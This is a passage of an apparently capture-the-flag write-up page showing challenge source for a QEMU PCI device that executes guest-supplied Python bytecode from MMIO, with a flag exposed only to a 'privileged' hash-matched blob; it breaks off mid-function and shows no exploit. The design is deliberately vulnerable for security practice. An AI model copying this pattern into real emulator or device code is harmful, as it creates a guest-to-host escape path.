<span class="n">PyObject</span> <span class="o">*</span><span class="nf">pypu_capture_new</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cap</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="kt">int</span> <span class="n">type_ready</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">type_ready</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">PyType_Ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CaptureType</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">type_ready</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">PypuCapture</span> <span class="o">*</span><span class="n">cf</span> <span class="o">=</span> <span class="n">PyObject_New</span><span class="p">(</span><span class="n">PypuCapture</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CaptureType</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cf</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">=</span> <span class="n">cap</span><span class="p">;</span>
    <span class="n">cf</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">&amp;&amp;</span> <span class="n">cf</span><span class="o">-&gt;</span><span class="n">cap</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cf</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">)</span><span class="n">cf</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>src/pypu-capture.h</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="cp">#pragma once
</span>
<span class="cp">#include</span> <span class="cpf">&lt;Python.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">PyObject_HEAD</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">cap</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pos</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PypuCapture</span><span class="p">;</span>

<span class="n">PyObject</span> <span class="o">*</span><span class="nf">pypu_capture_new</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cap</span><span class="p">);</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>src/pypu-pci.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
515
516
517
518
519
520
521
522
523
524
525
526
527
528
529
530
531
532
533
534
535
536
537
538
539
540
541
542
543
544
545
546
547
548
549
550
551
552
553
554
555
556
557
558
559
560
561
562
563
564
565
566
567
568
569
570
571
572
573
574
575
576
577
578
579
580
581
582
583
584
585
586
587
588
589
590
591
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"qemu/osdep.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;Python.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/landlock.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;marshal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"glib.h"</span><span class="cp">
#include</span> <span class="cpf">"hw/pci/pci.h"</span><span class="cp">
#include</span> <span class="cpf">"hw/pci/pci_device.h"</span><span class="cp">
#include</span> <span class="cpf">"hw/pci/pcie.h"</span><span class="cp">
#include</span> <span class="cpf">"hw/pci/pci_ids.h"</span><span class="cp">
#include</span> <span class="cpf">"hw/qdev-properties.h"</span><span class="cp">
#include</span> <span class="cpf">"qemu/cutils.h"</span><span class="cp">
#include</span> <span class="cpf">"qemu/module.h"</span><span class="cp">
#include</span> <span class="cpf">"qemu/thread.h"</span><span class="cp">
#include</span> <span class="cpf">"system/memory.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"pypu-capture.h"</span><span class="cp">
#include</span> <span class="cpf">"pypu-privileged.h"</span><span class="cp">
</span>
<span class="cp">#define TYPE_PYPU_PCI "pypu-pci"
#define PYPU_PCI(obj) OBJECT_CHECK(PypuPCIState, (obj), TYPE_PYPU_PCI)
#define CODE_BUF_SIZE 2048
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">PypuPCIState</span> <span class="p">{</span>
    <span class="n">PCIDevice</span> <span class="n">parent_obj</span><span class="p">;</span>

    <span class="n">MemoryRegion</span> <span class="n">mmio</span><span class="p">;</span>
    <span class="n">MemoryRegion</span> <span class="n">stdout_mmio</span><span class="p">;</span>
    <span class="n">MemoryRegion</span> <span class="n">stderr_mmio</span><span class="p">;</span>

    <span class="kt">uint8_t</span> <span class="n">code</span><span class="p">[</span><span class="n">CODE_BUF_SIZE</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">stdout_capture</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">stderr_capture</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="kt">uint32_t</span> <span class="n">scratch</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">greet_count</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">code_len</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">work_gen</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">done_gen</span><span class="p">;</span>
    <span class="n">bool</span> <span class="n">py_thread_alive</span><span class="p">;</span>

    <span class="n">QemuThread</span> <span class="n">py_thread</span><span class="p">;</span>
    <span class="n">QemuMutex</span> <span class="n">py_mutex</span><span class="p">;</span>
    <span class="n">QemuCond</span> <span class="n">py_cond</span><span class="p">;</span>

    <span class="n">PyObject</span> <span class="o">*</span><span class="n">globals_dict</span><span class="p">;</span>
    <span class="n">PyObject</span> <span class="o">*</span><span class="n">gifts_module</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PypuPCIState</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">uint32_t</span> <span class="nf">load_le32</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span>
           <span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">load_le64</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">load_le32</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">load_le32</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">debug_log</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="kt">int</span> <span class="n">initialized</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">int</span> <span class="n">enabled</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">initialized</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">env</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"PYPU_DEBUG"</span><span class="p">);</span>
        <span class="n">enabled</span> <span class="o">=</span> <span class="n">env</span> <span class="o">&amp;&amp;</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">initialized</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">enabled</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">va_list</span> <span class="n">ap</span><span class="p">;</span>
    <span class="n">va_start</span><span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
    <span class="n">vfprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">ap</span><span class="p">);</span>
    <span class="n">va_end</span><span class="p">(</span><span class="n">ap</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">pypu_get_globals</span><span class="p">(</span><span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="n">bool</span> <span class="n">privileged</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PyObject</span> <span class="o">*</span><span class="n">main_module</span> <span class="o">=</span> <span class="n">PyImport_AddModule</span><span class="p">(</span><span class="s">"__main__"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">main_module</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">PyObject</span> <span class="o">*</span><span class="n">globals_dict</span> <span class="o">=</span> <span class="n">PyModule_GetDict</span><span class="p">(</span><span class="n">main_module</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">globals_dict</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">PyDict_SetItemString</span><span class="p">(</span><span class="n">globals_dict</span><span class="p">,</span> <span class="s">"__builtins__"</span><span class="p">,</span> <span class="n">PyEval_GetBuiltins</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">PyObject</span> <span class="o">*</span><span class="n">sys_module</span> <span class="o">=</span> <span class="n">PyImport_ImportModule</span><span class="p">(</span><span class="s">"sys"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sys_module</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">PyObject</span> <span class="o">*</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">pypu_capture_new</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stdout_capture</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stdout</span> <span class="o">||</span> <span class="n">PyObject_SetAttrString</span><span class="p">(</span><span class="n">sys_module</span><span class="p">,</span> <span class="s">"stdout"</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="n">PyObject</span> <span class="o">*</span><span class="n">stderr</span> <span class="o">=</span> <span class="n">pypu_capture_new</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">stderr_capture</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stderr</span> <span class="o">||</span> <span class="n">PyObject_SetAttrString</span><span class="p">(</span><span class="n">sys_module</span><span class="p">,</span> <span class="s">"stderr"</span><span class="p">,</span> <span class="n">stderr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>

        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>
        <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">globals_dict</span><span class="p">);</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span> <span class="o">=</span> <span class="n">globals_dict</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PyObject</span> <span class="o">*</span><span class="n">gifts_module</span> <span class="o">=</span> <span class="n">PyModule_New</span><span class="p">(</span><span class="s">"gifts"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">gifts_module</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">PyObject</span> <span class="o">*</span><span class="n">flag_val</span> <span class="o">=</span> <span class="n">PyUnicode_FromString</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">flag_val</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">gifts_module</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">PyModule_AddObject</span><span class="p">(</span><span class="n">gifts_module</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">,</span> <span class="n">flag_val</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">flag_val</span><span class="p">);</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">gifts_module</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span> <span class="o">=</span> <span class="n">gifts_module</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PyObject</span> <span class="o">*</span><span class="n">sys_module</span> <span class="o">=</span> <span class="n">PyImport_ImportModule</span><span class="p">(</span><span class="s">"sys"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sys_module</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PyErr_Print</span><span class="p">();</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PyObject</span> <span class="o">*</span><span class="n">modules</span> <span class="o">=</span> <span class="n">PyObject_GetAttrString</span><span class="p">(</span><span class="n">sys_module</span><span class="p">,</span> <span class="s">"modules"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">modules</span> <span class="o">||</span> <span class="o">!</span><span class="n">PyDict_Check</span><span class="p">(</span><span class="n">modules</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">PyErr_Print</span><span class="p">();</span>
        <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">modules</span><span class="p">);</span>
        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">privileged</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">PyDict_SetItemString</span><span class="p">(</span><span class="n">modules</span><span class="p">,</span> <span class="s">"gifts"</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">gifts_module</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Print</span><span class="p">();</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">modules</span><span class="p">);</span>
            <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">PyDict_DelItemString</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span><span class="p">,</span> <span class="s">"gifts"</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Clear</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">PyDict_DelItemString</span><span class="p">(</span><span class="n">modules</span><span class="p">,</span> <span class="s">"gifts"</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">PyErr_Clear</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">modules</span><span class="p">);</span>
    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">sys_module</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">globals_dict</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">execute_python_code</span><span class="p">(</span><span class="n">PypuPCIState</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">pyc</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">pyc_len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] executing python code from MMIO (%u bytes)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pyc_len</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pyc_len</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"%s%02x"</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="s">"[pypu] code bytes: "</span> <span class="o">:</span> <span class="s">" "</span><span class="p">),</span> <span class="n">pyc</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">debug_log</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pyc_len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="s">""</span> <span class="o">:</span> <span class="s">"[pypu] code bytes: &lt;none&gt;"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pyc_len</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] abort: missing header (%u bytes)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pyc_len</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PyGILState_STATE</span> <span class="n">gil</span> <span class="o">=</span> <span class="n">PyGILState_Ensure</span><span class="p">();</span>

    <span class="kt">uint32_t</span> <span class="n">header_magic</span> <span class="o">=</span> <span class="n">load_le32</span><span class="p">(</span><span class="n">pyc</span><span class="p">);</span>
    <span class="kt">uint32_t</span> <span class="n">pyc_flags</span> <span class="o">=</span> <span class="n">load_le32</span><span class="p">(</span><span class="n">pyc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">pyc_hash</span> <span class="o">=</span> <span class="n">load_le64</span><span class="p">(</span><span class="n">pyc</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">expected_magic</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">PyImport_GetMagicNumber</span><span class="p">();</span>
    <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] pyc header: magic=0x%08x expected=0x%08lx flags=0x%08x hash=0x%016"</span> <span class="n">PRIx64</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
              <span class="n">header_magic</span><span class="p">,</span> <span class="n">expected_magic</span><span class="p">,</span> <span class="n">pyc_flags</span><span class="p">,</span> <span class="n">pyc_hash</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">header_magic</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">expected_magic</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] abort: bad pyc magic</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">PyGILState_Release</span><span class="p">(</span><span class="n">gil</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bool</span> <span class="n">privileged</span> <span class="o">=</span> <span class="n">pyc_hash</span> <span class="o">==</span> <span class="n">PYPU_PRIVILEGED_HASH</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">privileged</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">debug_log</span><span class="p">(</span><span class="s">"[pypu] pyc hash matches privileged blob (0x%016"</span> <span class="n">PRIx64</span> <span class="s">")</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                  <span class="n">PYPU_PRIVILEGED_HASH</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">pyc</span> <span class="o">+</span> <span class="mi">16</span><span class="p">;</span>
    <span class="n">Py_ssize_t</span> <span class="n">code_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">Py_ssize_t</span><span class="p">)</span><span class="n">pyc_len</span> <span class="o">-</span> <span class="mi">16</span><span class="p">;</span>
